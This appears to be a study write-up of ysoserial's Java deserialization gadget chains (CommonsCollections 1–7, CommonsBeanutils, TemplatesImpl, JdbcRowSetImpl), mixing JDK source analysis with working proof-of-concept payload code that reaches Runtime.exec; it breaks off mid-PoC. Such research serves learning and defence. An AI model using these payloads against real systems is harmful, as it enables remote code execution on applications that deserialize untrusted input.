---
title: 'Java Deserialize Vulnerabilities, ysoserial study'
categories:
  - Pentest
  - JavaSec
date: 2023-10-24 00:00:00
tags:
---
# Sinks
## TemplatesImpl exploit


> [!NOTE] Pre-requirements
> Codes in this section are written with JDK7u21

`TemplatesImpl` provides a public approach to defining and instantiating classes from byte code.
```java
static final class TransletClassLoader extends ClassLoader {  
    TransletClassLoader(ClassLoader parent) {  
        super(parent);  
    }  
   Class defineClass(final byte[] b) {  
        return defineClass(null, b, 0, b.length);  
    }  
}
```


Backtracking, in `defineTransletClasses` method calls `TransletClassLoader.defineClass()`:
```java
private void defineTransletClasses()  
    throws TransformerConfigurationException {  
  
    if (_bytecodes == null) {  
        ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);  
        throw new TransformerConfigurationException(err.toString());  
    }  
  
    TransletClassLoader loader = (TransletClassLoader)  
        AccessController.doPrivileged(new PrivilegedAction() {  
            public Object run() {  
                return new TransletClassLoader(ObjectFactory.findClassLoader());  
            }  
        });  
  
    try {  
        final int classCount = _bytecodes.length;  
        _class = new Class[classCount];  
  
        if (classCount > 1) {  
            _auxClasses = new Hashtable();  
        }  
  
        for (int i = 0; i < classCount; i++) {  
            _class[i] = loader.defineClass(_bytecodes[i]);  
            final Class superClass = _class[i].getSuperclass();  
  
            // Check if this is the main class  
            if (superClass.getName().equals(ABSTRACT_TRANSLET)) {  
                _transletIndex = i;  
            }  
            else {  
                _auxClasses.put(_class[i].getName(), _class[i]);  
            }  
        }  
  
        if (_transletIndex < 0) {  
            ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);  
            throw new TransformerConfigurationException(err.toString());  
        }  
    }  
    catch (ClassFormatError e) {  
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);  
        throw new TransformerConfigurationException(err.toString());  
    }  
    catch (LinkageError e) {  
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);  
        throw new TransformerConfigurationException(err.toString());  
    }  
}
```
There is a constraint that the superclass of the newly defined should be consistent with `AbstractTranslet`.

Backtracking, in `getTransletInstance` method, call `defineTransletClasses()` and instantiate the newly defined class:
```java
private Translet getTransletInstance()  
    throws TransformerConfigurationException {  
    try {  
        if (_name == null) return null;  
  
        if (_class == null) defineTransletClasses();  
		
		AbstractTranslet translet = (AbstractTranslet)_class[_transletIndex].newInstance();  
        translet.postInitialization();  
        translet.setTemplates(this);  
        translet.setServicesMechnism(_useServicesMechanism);  
        if (_auxClasses != null) {  
            translet.setAuxiliaryClasses(_auxClasses);  
        }  
  
        return translet;  
    }
    ...
}
```

In `newTransformer` method calls `getTransletInstance()` and it's public so we can find its reference for further exploitation:
```java
public synchronized Transformer newTransformer()  
    throws TransformerConfigurationException  
{  
    TransformerImpl transformer;  
  
    transformer = new TransformerImpl(getTransletInstance(), _outputProperties,  
        _indentNumber, _tfactory);  
  
    if (_uriResolver != null) {  
        transformer.setURIResolver(_uriResolver);  
    }  
  
    if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {  
        transformer.setSecureProcessing(true);  
    }  
    return transformer;  
}
```

#### Proof of Concept
```java
Class templatesImplCls = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");  
Class abstractTransletCls = Class.forName("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");  
Class factoryCls = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl");  
  
ClassPool classPool = ClassPool.getDefault();  
classPool.insertClassPath(new ClassClassPath(Gadgets.StubTransletPayload.class));  
  
CtClass clazz = classPool.get(Gadgets.StubTransletPayload.class.getName());  
String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";  
clazz.makeClassInitializer().insertAfter(cmd);  
  
CtClass abstractTransletCtCls = classPool.get(abstractTransletCls.getName());  
clazz.setSuperclass(abstractTransletCtCls);  
String className = "payload" + System.nanoTime();  
clazz.setName(className);  
  
byte[] bytecode = clazz.toBytecode();

Object templates = templatesImplCls.newInstance();  
Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{bytecode, ClassFiles.classAsBytes(Gadgets.Foo.class)});  
Reflections.setFieldValue(templates, "_name", "xxx");  
Reflections.setFieldValue(templates, "_tfactory", factoryCls.newInstance());  
  
((TemplatesImpl) templates).newTransformer();
```

## JdbcRowSetImpl exploit


> [!NOTE] pre-requirements
> Reproduced on JDK1.8

The method `connect()` of `JdbcRowSetImpl` can look up the JNDI URL stored in `databaseMetaData` property.
```java
private Connection connect() throws SQLException {
	if(conn != null) {  
    return conn;  
  
	} else if (getDataSourceName() != null) {  
	   ...
		Context ctx = new InitialContext();  
		DataSource ds = (DataSource)ctx.lookup  
			(getDataSourceName());
	...
	}
...
}
```

# Kick-offs
## AnnotationInvocationHandler exploit
This class serves as a deserialization enter point.
In its deserialization process, `entrySet()` and `getValue()` method will be called on its `memberValues` member. The `entrySet()` can take effect associated with proxy([[Java Deserialize Vulnerabilities ysoserial study#Using TemplatesImpl (CB1 CB2)|example]]). The `getValue()` is widely used in CommonsCollections chain.
```java
private void readObject(java.io.ObjectInputStream s)  
    throws java.io.IOException, ClassNotFoundException {  
    ObjectInputStream.GetField fields = s.readFields();
    ...
    Map<String, Object> streamVals = (Map<String,Object>)fields.get("memberValues", null);
	...
    for (Map.Entry<String, Object> memberValue : streamVals.entrySet()) {  
	    String name = memberValue.getKey();  
	    Object value = null;  
	    Class<?> memberType = memberTypes.get(name);  
	    if (memberType != null) {  // i.e. member still exists  
	        value = memberValue.getValue();  
	        if (!(memberType.isInstance(value) ||  
	              value instanceof ExceptionProxy)) {  
	            value = new AnnotationTypeMismatchExceptionProxy(  
	                        objectToString(value))  
	                .setMember(annotationType.members().get(name));  
        }  
    }
```


## PriorityQueue exploit
The `PriorityQueue` class is a deserialization enter point.
Combine it with a certain comparator(e.g. [[Java Deserialize Vulnerabilities ysoserial study#CommonCollections2|TransformingComparator in CC2]], [[Java Deserialize Vulnerabilities ysoserial study#CommonsBeanutils|BeanComparator in CB1]]), the `compare()` method would be triggered in the deserialization process. 
```java
private void readObject(java.io.ObjectInputStream s)  
    throws java.io.IOException, ClassNotFoundException {
    ...
    heapify();
}

private void heapify() {  
    for (int i = (size >>> 1) - 1; i >= 0; i--)  
        siftDown(i, (E) queue[i]);  
}

private void siftDown(int k, E x) {  
    if (comparator != null)  
        siftDownUsingComparator(k, x);  
    else        siftDownComparable(k, x);  
}

private void siftDownUsingComparator(int k, E x) {  
    int half = size >>> 1;  
    while (k < half) {  
        ...
        if (right < size &&  
            comparator.compare((E) c, (E) queue[right]) > 0)  
            c = queue[child = right];  
        if (comparator.compare(x, (E) c) <= 0)  
            break;  
        ...
    }  
    ...  
}
```

# Chains
## CommonCollections
### CommonCollections1

> [!NOTE] Pre-requirements
> JDK < 1.8 (Tested on JDK7u21, fail on JDK1.8)
> commons-collections:commons-collections:3.1


> [!NOTE] 
> There are main two variants of CC1, `LazyMap` or `TransformedMap`

#### Using `LazyMap`

```java
//Gadget chain:
ObjectInputStream.readObject()
	AnnotationInvocationHandler.readObject()
		Map(Proxy).entrySet()
			AnnotationInvocationHandler.invoke()
				LazyMap.get()
					ChainedTransformer.transform()
						ConstantTransformer.transform()
						InvokerTransformer.transform()
							Method.invoke()
								Class.getMethod()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.getRuntime()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.exec()
```

Use `AnnotationInvocationHandler` object(handler1) to trigger deserialize method `readObject`, it contains a dynamic proxy object for `Map` interface, another `AnnotationInvocationHandler` object(handler2) is contained in this `Proxy` object, handler2 contains a `LazyMap` armed with the evil transformer chain.
![[Pasted image 20231008190210.png|700]]

Firstly, when a deserialize procession is started, in handler1's `readObject`:
```java
private void readObject(java.io.ObjectInputStream s)  
    throws java.io.IOException, ClassNotFoundException {  
    ObjectInputStream.GetField fields = s.readFields();
    ...
    Map<String, Object> streamVals = (Map<String,Object>)fields.get("memberValues", null);
	...
    for (Map.Entry<String, Object> memberValue : streamVals.entrySet()) {  
	    String name = memberValue.getKey();  
	    Object value = null;  
	    Class<?> memberType = memberTypes.get(name);  
	    if (memberType != null) {  // i.e. member still exists  
	        value = memberValue.getValue();  
	        if (!(memberType.isInstance(value) ||  
	              value instanceof ExceptionProxy)) {  
	            value = new AnnotationTypeMismatchExceptionProxy(  
	                        objectToString(value))  
	                .setMember(annotationType.members().get(name));  
        }  
    }
```
Obtain `memberValues`(which is a `Proxy`) and call `entrySet()` on it. The proxy will employ its `InvocationHandler` member to trigger `invoke()` method with *entrySet* method as one of parameters. In handler2's `invoke()`:
```java
public Object invoke(Object proxy, Method method, Object[] args) {  
    String member = method.getName();
    ...
    Object result = memberValues.get(member);  
	if (result == null)  
	    throw new IncompleteAnnotationException(type, member);
	...
}
```
As for handler2, `memberValues` is a `LazyMap` object with evil transformer chain, when its `get` is called, since there is no key like *entrySet* in this empty map, the transformer chain will be triggered as code below presents:
```java
// LazyMap.java
public Object get(Object key) {  
    // create value for key if key is not currently in the map  
    if (map.containsKey(key) == false) {  
        Object value = factory.transform(key);  
        map.put(key, value);  
        return value;  
    }  
    return map.get(key);  
}
```

The evil transformer chain is usually presented as:
```java
final Transformer transformerChain = new ChainedTransformer(  
    new Transformer[]{new ConstantTransformer(1)});  
// real chain for after setup  
final Transformer[] transformers = new Transformer[]{  
    new ConstantTransformer(Runtime.class),  
    new InvokerTransformer("getMethod", new Class[]{  
        String.class, Class[].class}, new Object[]{  
        "getRuntime", new Class[0]}),  
    new InvokerTransformer("invoke", new Class[]{  
        Object.class, Object[].class}, new Object[]{  
        null, new Object[0]}),  
    new InvokerTransformer("exec",  
        new Class[]{String.class}, execArgs),  
    new ConstantTransformer(1)};

Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
```
End.

#### Using `TransformedMap`

```java
//Gadget chain:
transform:121, ChainedTransformer (org.apache.commons.collections.functors)  
checkSetValue:169, TransformedMap (org.apache.commons.collections.map)  
setValue:191, AbstractInputCheckedMapDecorator$MapEntry (org.apache.commons.collections.map)  
readObject:-1, AnnotationInvocationHandler (sun.reflect.annotation)  
readObject:-1, ObjectInputStream (java.io)
```

Look in `AnnotationInvocationHandler`'s `readObject`:
```java
private void readObject(java.io.ObjectInputStream s)  
    throws java.io.IOException, ClassNotFoundException {  
    ObjectInputStream.GetField fields = s.readFields();
    ...
    AnnotationType annotationType = null;  
	try {  
	    annotationType = AnnotationType.getInstance(t);  
	} catch(IllegalArgumentException e) {  
	    // Class is no longer an annotation type; time to punch out  
	    throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");  
	}
	...
    Map<String, Class<?>> memberTypes = annotationType.memberTypes();
    ...
    Map<String, Object> streamVals = (Map<String,Object>)fields.get("memberValues", null);
	...
    for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
            String name = memberValue.getKey();
            Class<?> memberType = memberTypes.get(name);
            if (memberType != null) {  // i.e. member still exists
                Object value = memberValue.getValue();
                if (!(memberType.isInstance(value) ||
                      value instanceof ExceptionProxy)) {
                    memberValue.setValue(
                        new AnnotationTypeMismatchExceptionProxy(
                            value.getClass() + "[" + value + "]").setMember(
                                annotationType.members().get(name)));
                }
            }
        }
```
`AnnotationType.memberTypes()` will return the member name and type of specific annotation type, for `Target` annotation, its `memberTypes()` would return :
```java
"value": class [Ljava.lang.annotation.ElementType;
```
There are two constraints in code above.
1. `streamVals`(which is a Map) should have an entry whose key exists in `annotationType`'s `memberTypes` Map, for `Target`, it should be String *"value"*. Therefore, our `TransformedMap` should contain key *"value"*;
2. `memberValue` should not be the same type as the corresponding value of `streamVals`, i.e. the value of the entry in `TransformedMap` should not falls in either `java.lang.annotation.ElementType` nor `ExceptionProxy`.
Transformer chain would be triggered along with the call to `memberValue.setValue()`

Further, look into `TransformedMap`'s `entrySet`(which backtracks to parent `AbstractInputCheckedMapDecorator`):
```java
public Set entrySet() {  
    if (isSetValueChecking()) {  
        return new EntrySet(map.entrySet(), this);  
    } else {  
        return map.entrySet();  
    }  
}
```

Follow into `EntrySet`:
```java
static class EntrySet extends AbstractSetDecorator {
	...
	public Iterator iterator() {  
	    return new EntrySetIterator(collection.iterator(), parent);  
	}
	...
```

In `EntrySetIterator`:
```java
static class EntrySetIterator extends AbstractIteratorDecorator {
	public Object next() {  
	    Map.Entry entry = (Map.Entry) iterator.next();  
	    return new MapEntry(entry, parent);  
	}
}
```

In `MapEntry`:
```java
static class MapEntry extends AbstractMapEntryDecorator {
	public Object setValue(Object value) {  
	    value = parent.checkSetValue(value);  
	    return entry.setValue(value);  
	}
}
```

Look into `TransformedMap`'s `checkSetValue`:
```java
protected Object checkSetValue(Object value) {  
    return valueTransformer.transform(value);  
}
```

As a result, when handler triggers `memberValue.setValue()`, control falls successively into the code chain above  and eventually trigger `transform` method.

End.

### CommonCollections2


> [!NOTE] pre-requirements
> JDK <= 1.7
> commons-collections:commons-collections4:4.0

The `TransformingComparator` transforms the objects before comparison.
```java
public int compare(final I obj1, final I obj2) {
	final O value1 = this.transformer.transform(obj1);
	final O value2 = this.transformer.transform(obj2);
	return this.decorated.compare(value1, value2);
}
```
`PriorityQueue` can employ `TransformingComparator` to sort objects. In `readObject()` method:
```java
private void readObject(java.io.ObjectInputStream s)  
    throws java.io.IOException, ClassNotFoundException {
    ...
    heapify();
}

private void heapify() {  
    for (int i = (size >>> 1) - 1; i >= 0; i--)  
        siftDown(i, (E) queue[i]);  
}

private void siftDown(int k, E x) {  
    if (comparator != null)  
        siftDownUsingComparator(k, x);  
    else        siftDownComparable(k, x);  
}

private void siftDownUsingComparator(int k, E x) {  
    int half = size >>> 1;  
    while (k < half) {  
        ...
        if (right < size &&  
            comparator.compare((E) c, (E) queue[right]) > 0)  
            c = queue[child = right];  
        if (comparator.compare(x, (E) c) <= 0)  
            break;  
        ...
    }  
    ...  
}
```
Insert a `TemplatesImpl` object into priority queue and use an `InvokerTranformer` configured with `newTransformer` method to decorate the comparator. While deserialization the queue, the `newTransformer` method of `TemplatesImpl` is called and arbitrary code is executed.

Poc:
```java
final Object templates = Gadgets.createTemplatesImpl(command);  
// mock method name until armed  
final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);  
  
// create queue with numbers and basic comparator  
final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(transformer));  
// stub data for replacement later  
queue.add(1);  
queue.add(1);  
  
// switch method called by comparator  
Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");  
  
// switch contents of queue  
final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");  
queueArray[0] = templates;  
queueArray[1] = 1;

return queue;
```


### CommonCollections3

> A variant of CC1, replace `InvokerTransformer` by `InstantiateTransformer`


> [!NOTE] pre-requirements
> JDK <= 7u21, reproduce on jdk7u21
> commons-collections:commons-collections:3.1

As [[Java Deserialize Vulnerabilities ysoserial study#TemplatesImpl exploit|this section]] presents, `TemplatesImpl`'s `newTransformer` exposes an approach to loading arbitrary byte code.

Seek for reference of `TemplatesImpl`'s `newTransformer` method, find in `TrAXFilter`'s constructor:
```java
public TrAXFilter(Templates templates)  throws  
    TransformerConfigurationException  
{  
    _templates = templates;  
    _transformer = (TransformerImpl) templates.newTransformer();  
    _transformerHandler = new TransformerHandlerImpl(_transformer);  
    _useServicesMechanism = _transformer.useServicesMechnism();  
}
```

Immediately after [[Java Deserialize Vulnerabilities ysoserial study#Proof of Concept|this code section]], proof concept above by code below:
```java
...
Class cls = com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.class;  
Constructor constructor = cls.getDeclaredConstructor(Templates.class);  
constructor.setAccessible(true);  
constructor.newInstance(templates); // templates is TemplatesImpl type
```

This routine can be translated into the form of transformers, by introducing `InstantiateTransformer`:
```java
final Transformer[] transformers = new Transformer[] {  
      new ConstantTransformer(TrAXFilter.class),  
      new InstantiateTransformer(  
            new Class[] { Templates.class },  
            new Object[] { templates } )};
```

Use whichever payload in [[Java Deserialize Vulnerabilities ysoserial study#CommonCollections1|CC1]] to reach the eventual payload.

End.

### CommonCollections4


> [!NOTE] pre-requirements
> JDK <= 1.7 
> commons-collections:commons-collections:4.0

This payload uses the same vulnerability as [[Java Deserialize Vulnerabilities ysoserial study#CommonCollections2|CC2]] but uses a different exploit chain.
Specifically, this payload uses `TrAXFilter`, triggers transformer from its constructor.
Poc:
```java
Object templates = Gadgets.createTemplatesImpl(command);  
  
ConstantTransformer constant = new ConstantTransformer(String.class);  
  
// mock method name until armed  
Class[] paramTypes = new Class[] { String.class };  
Object[] args = new Object[] { "foo" };  
InstantiateTransformer instantiate = new InstantiateTransformer(  
      paramTypes, args);  
  
// grab defensively copied arrays  
paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");  
args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");  
  
ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });  
  
// create queue with numbers  
PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(chain));  
queue.add(1);  
queue.add(1);  
  
// swap in values to arm  
Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);  
paramTypes[0] = Templates.class;  
args[0] = templates;  
  
return queue;
```


### CommonCollections5


> [!NOTE] pre-requirements
> JDK >= 1.8, reproduce with JDK1.8_0382
> commons-collections:commons-collections:3.1


```java
// Gadgets chain:
transform:121, ChainedTransformer (org.apache.commons.collections.functors)
get:151, LazyMap (org.apache.commons.collections.map)
getValue:73, TiedMapEntry (org.apache.commons.collections.keyvalue)
toString:131, TiedMapEntry (org.apache.commons.collections.keyvalue)
readObject:86, BadAttributeValueExpException (javax.management)
readObject:461, ObjectInputStream (java.io)
```

In JDK1.8, there is new restriction on `AnnotationInvocationHandler`([[Java Deserialize Vulnerabilities ysoserial study#JDK fixes|here]]), but updates to the `BadAttributeValueExpException` class can be exploited to fill the vacancy.
`TiedMapEntry` can bind key to a specific map, any operation on this entry will be delegated to that map.

Firstly, look into `BadAttributeValueExpException`'s `readObject`:
```java
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {  
    ObjectInputStream.GetField gf = ois.readFields();  
    Object valObj = gf.get("val", null);  
  
    if (valObj == null) {  
        val = null;  
    } else if (valObj instanceof String) {  
        val= valObj;  
    } else if (System.getSecurityManager() == null  
            || valObj instanceof Long  
            || valObj instanceof Integer  
            || valObj instanceof Float  
            || valObj instanceof Double  
            || valObj instanceof Byte  
            || valObj instanceof Short  
            || valObj instanceof Boolean) {  
        val = valObj.toString();  
    } else { // the serialized object is from a version without JDK-8019292 fix  
        val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();  
    }  
}
```
Its `val` member could be any type assigned by constructor. Here we can see a constraint that `System.getSecurityManager()` should be null. Note that, in former JDK version(<1.8), `BadAttributeValueExpException` have not override `readObject` so it's not vulnerable.

Step into `TiedMapEntry`'s `toString()`:
```java
public String toString() {  
    return getKey() + "=" + getValue();  
}

public Object getValue() {  
    return map.get(key);  
}
```
`toString()` will call `getValue()` and call `map.get()`, satisfying `LazyMap`'s constraint.

So here comes the Poc(partial):
```java
...
final Map innerMap = new HashMap();  
final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);  
TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");  
BadAttributeValueExpException val = new BadAttributeValueExpException(null);  
Field valfield = val.getClass().getDeclaredField("val");  
      Reflections.setAccessible(valfield);  
valfield.set(val, entry);
...
```

End.

### CommonCollections6 jdk1.8 1.7


> [!NOTE] pre-requirements
> JDK1.7 or 1.8, reproduce successful on both
> commons-collections:commons-collections:3.1


```java
//Gadget chain:
	java.io.ObjectInputStream.readObject()
		java.util.HashSet.readObject()
			java.util.HashMap.put()
			java.util.HashMap.hash()
				org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
				org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
					org.apache.commons.collections.map.LazyMap.get()
						org.apache.commons.collections.functors.ChainedTransformer.transform()
						org.apache.commons.collections.functors.InvokerTransformer.transform()
						java.lang.reflect.Method.invoke()
							java.lang.Runtime.exec()
```

In general, `TiedMapEntry`'s `hashCode()` method would call `map.get(key)` and make a flaw for `LazyMap`. `HashMap`'s `readObject()` calls `hashCode()` of key to calculate hash, which makes sense for the exploitation above.

Firstly, see `HashMap`'s `readObject()`:
```java
private void readObject(ObjectInputStream s)  
    throws IOException, ClassNotFoundException {  
  ...
  for (int i = 0; i < mappings; i++) {  
	    @SuppressWarnings("unchecked")  
	        K key = (K) s.readObject();  
	    @SuppressWarnings("unchecked")  
	        V value = (V) s.readObject();  
	    putVal(hash(key), key, value, false, false);  
	}
	...
    
```

Step into `hash()`:
```java
static final int hash(Object key) {  
    int h;  
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);  
}
```
If key is a `TiedMapEntry`, then the common exploitation chain takes effect.

So the next step is to put a `TiedMapEntry` into hash map. 
To avoid contaminating `LazyMap` during payload creation, **we should not just call  `map.put` to insert node**. In order to avoid calling `hash(entry)`, there are two alternative ways: by `putVal()` or directly inserting node into underlying hash table(later is what ysoserial does). Let's reproduce the former way(`putVal`). 
```java
final Map innerMap = new HashMap();  
final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);  
TiedMapEntry entry = new TiedMapEntry(lazyMap, "padishah");  
  
HashMap map = new HashMap();  
Method putMethod = null;  
int JDK_VERSION = -1;  
try {  
    putMethod = HashMap.class.getDeclaredMethod("putVal", int.class, Object.class, Object.class, boolean.class, boolean.class);  
    JDK_VERSION = 8;  
} catch (NoSuchMethodException e) {  
    putMethod = HashMap.class.getDeclaredMethod("addEntry", int.class, Object.class, Object.class, int.class);  
    JDK_VERSION = 7;  
}  
putMethod.setAccessible(true);  
int hash = transformerChain.hashCode();// a random hashcode  
if (JDK_VERSION == 8) {  
    putMethod.invoke(map, hash, entry, "value", false, true);  
} else {  
    putMethod.invoke(map, hash, entry, "value", 0);  
}  
Reflections.setFieldValue(transformerChain, "iTransformers", transformers);  
return map;
```
^CC6-1
Note that, `HashMap` for JDK1.7 adds node in a different way from that of JDK1.8. JDK1.7 use `addEntry` in replacement of `putVal`.

### CommonCollections7 jdk1.8 1.7


> [!NOTE] pre-requirements
> JDK1.7 or 1.8, only reproduced on JDK1.8
> commons-collections:commons-collections:3.1

```java
//Gadget chain:
java.util.Hashtable.readObject  
java.util.Hashtable.reconstitutionPut  
org.apache.commons.collections.map.AbstractMapDecorator.equals  
java.util.AbstractMap.equals  
org.apache.commons.collections.map.LazyMap.get  
org.apache.commons.collections.functors.ChainedTransformer.transform  
org.apache.commons.collections.functors.InvokerTransformer.transform  
java.lang.reflect.Method.invoke  
sun.reflect.DelegatingMethodAccessorImpl.invoke  
sun.reflect.NativeMethodAccessorImpl.invoke  
sun.reflect.NativeMethodAccessorImpl.invoke0  
java.lang.Runtime.exec
```

#### Overview

This vulnerability exists in `Hashtable`'s hash collision check progress which is part of `readObject()`. It will compare hash between the node to be inserted and each existing node. If their hash appears to be the same, then compare further using `equals()`. Both `hashCode()` and `equals()` are delegated to the node itself. 
`AbstractMap`(which is the super class of `HashMap`)'s `equals()` will call `that.get()`, that satisfies `LazyMap`'s trigger condition. 
It's quite easy to spoof two `LazyMap` nodes that have the same hash but different keys. This is how this vul occurs.

#### Exploit chain

Firstly, see `Hashtable`'s `readObject()`:
```java
private void readObject(ObjectInputStream s)  
     throws IOException, ClassNotFoundException  
{
	for (; elements > 0; elements--) {  
	    @SuppressWarnings("unchecked")  
	        K key = (K)s.readObject();  
	    @SuppressWarnings("unchecked")  
	        V value = (V)s.readObject();  
	    // sync is eliminated for performance  
	    reconstitutionPut(table, key, value);  
	}
}

```

Step into `reconstitutionPut()`:
```java
private void reconstitutionPut(Entry<?,?>[] tab, K key, V value)  
    throws StreamCorruptedException  
{
	...
	int hash = key.hashCode();  
	int index = (hash & 0x7FFFFFFF) % tab.length;  
	for (Entry<?,?> e = tab[index] ; e != null ; e = e.next) {  
	    if ((e.hash == hash) && e.key.equals(key)) {  
	        throw new java.io.StreamCorruptedException();  
	    }  
	}
	...
}
```

We should satisfy `e.hash==hash` to reach `equals(key)`. When using `LazyMap` to decorate `HashMap`, `equals()` will delegate to `AbstractMap`:

```java
public boolean equals(Object o) {
	...
	Map<?,?> m = (Map<?,?>) o;
	...
	Iterator<Entry<K,V>> i = entrySet().iterator();  
	while (i.hasNext()) {  
	    Entry<K,V> e = i.next();  
	    K key = e.getKey();  
	    V value = e.getValue();  
	    if (value == null) {  
	        if (!(m.get(key)==null && m.containsKey(key)))  
	            return false;  
	    } else {  
	        if (!value.equals(m.get(key)))  
	            return false;  
	    }  
	}
	...
}
``` 
^CC7-01

If the input object `o` is a `LazyMap`, `m.get(key)` will trigger its transformers. By the way, even if a `LazyMap` does not have the key of another map, it's still equivalent to that map(which can be any map), since it's able to create the missing key and `get()` will always return a value. ^1b8389

#### Hash collision

After understanding the routine, let's construct the two `LazyMap`. First, look at the `hashCode()` of `LazyMap`, which delegates to `AbstractMapDecorator`, then delegates to the underlying map(here is `HashMap`), finally find it in its super class `AbstractMap`:
```java
public int hashCode() {  
    int h = 0;  
    Iterator<Entry<K,V>> i = entrySet().iterator();  
    while (i.hasNext())  
        h += i.next().hashCode();  
    return h;  
}
```
Consider a `LazyMap` with single entry: `"aa": 1`, its hash code should equals to `"aa".hashCode()`. Step into `String#hashCode`, its document says:

> Returns a hash code for this string. The hash code for a String object is computed as:
> s[0]*31^(n-1) + s[1]*31^(n-2) + ... + s[n-1]
> 
> using int arithmetic, where s[i] is the ith character of the string, n is the length of the string, and ^ indicates exponentiation. (The hash value of the empty string is zero.)

`"ab".hashCode()` is calculated as `'a'*31 + 'b'`. It's easy to find a collision. Abstract the hash code of two-character string to `x*31 + y`, which is equals to `(x+1)*31 + (y-31)`, so one of the equivalences of `"ab"` is `"bC"` .

#### Write payload
```java
ChainedTransformer chainedTransformer1 = new ChainedTransformer(new Transformer[]{});
Map innerMap1 = new HashMap();  
Map innerMap2 = new HashMap();  
LazyMap lazyMap1 = (LazyMap) LazyMap.decorate(innerMap1, chainedTransformer1);  
LazyMap lazyMap2 = (LazyMap) LazyMap.decorate(innerMap2, chainedTransformer1);  
lazyMap1.put("ab", 1);  
lazyMap2.put("bC", 1);  
  
Hashtable hashtable = new Hashtable();  
hashtable.put(lazyMap1, 1);  
hashtable.put(lazyMap2, 1);  
  
Reflections.setFieldValue(chainedTransformer1, "iTransformers", transformers);  
  
lazyMap2.remove("ab");

return hashtable;
```

Note that, while put `lazyMap2` into hash table, we can see in [[Java Deserialize Vulnerabilities ysoserial study#^CC7-01|this code block]] that `lazyMap2.get("ab")` would be called in `equals()`, so we should remove this redundant entry. To ensure `lazyMap2.get("ab")` is not equal to that of `lazyMap1`, we decorate `lazyMap2` with a transformer that will not return `1`(an empty chain, will get `ab: ab`).

End.




---

## CommonsBeanutils


> [!NOTE] pre-requirements
> JDK1.8
> commons-beanutils:commons-beanutils:1.9.2
> commons-collections:commons-collections:3.1
> commons-logging:commons-logging:1.2

### Using TemplatesImpl (CB1 CB2)

`TemplatesImpl` has an property named `_outputProperties` whose getter is `getOutputProperties()` according to java bean naming principle. 
```java
public synchronized Properties getOutputProperties() {   
	try {  
	    return newTransformer().getOutputProperties();  
	}  
	catch (TransformerConfigurationException e) {  
	    return null;  
	}  
}
```
In this method, the method `newTransformer()` is called, which serves as an entry to executing arbitrary code([[Java Deserialize Vulnerabilities ysoserial study#TemplatesImpl exploit|here]]).
The class `BeanComparator` in `commons-beanutils` project is disclosed for triggering this flaw in the deserialization procession.
In its `compare()` method:
```java
public int compare( T o1, T o2 ) {  
   ...
	Object value1 = PropertyUtils.getProperty( o1, property );  
	Object value2 = PropertyUtils.getProperty( o2, property );
	...
}
```

In `getSimpleProperty()` method:
```java
public Object getSimpleProperty(Object bean, String name){
	...
	PropertyDescriptor descriptor =  
        getPropertyDescriptor(bean, name);  
	if (descriptor == null) {  
	    throw new NoSuchMethodException("Unknown property '" +  
	            name + "' on class '" + bean.getClass() + "'" );  
	}  
	Method readMethod = getReadMethod(bean.getClass(), descriptor);  
	if (readMethod == null) {  
	    throw new NoSuchMethodException("Property '" + name +  
	            "' has no getter method in class '" + bean.getClass() + "'");  
	}  
	  
	// Call the property getter and return the value  
	Object value = invokeMethod(readMethod, bean, EMPTY_OBJECT_ARRAY);
	...

}
```
In this method, firstly it creates a `PropertyDescriptor` of the input bean and gets the getter according to the property name. When the getter is invoked, our `TemplatesImpl` is ignited.

Poc:
Note that, set the `property` member of `BeanComparator` to  `lowestSetBit` so as to successfully add initial value to queue. You can also set it to null.
```java
final Object templates = Gadgets.createTemplatesImpl(command);  
// mock method name until armed  
final BeanComparator comparator = new BeanComparator("lowestSetBit");// or null
  
// create queue with numbers and basic comparator  
final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);  
// stub data for replacement later  
queue.add(new BigInteger("1"));  
queue.add(new BigInteger("1"));  
  
Reflections.setFieldValue(comparator, "property", "outputProperties");  
Reflections.setFieldValue(queue, "queue", new Object[]{templates, templates});  
  
return queue;
```

### Using JdbcRowSetImpl (CB3)

The `JdbcRowSetImpl` class has a property named `databaseMetaData` whose getter calls `connect()` to look up a JNDI URL.
```java
public DatabaseMetaData getDatabaseMetaData() throws SQLException {  
    Connection con = connect();  
    return con.getMetaData();  
}
```

Poc:
```java
BeanComparator comparator = new BeanComparator("lowestSetBit");  
JdbcRowSetImpl rs         = new JdbcRowSetImpl();  
rs.setDataSourceName(jndiURL);  
rs.setMatchColumn("xx");  
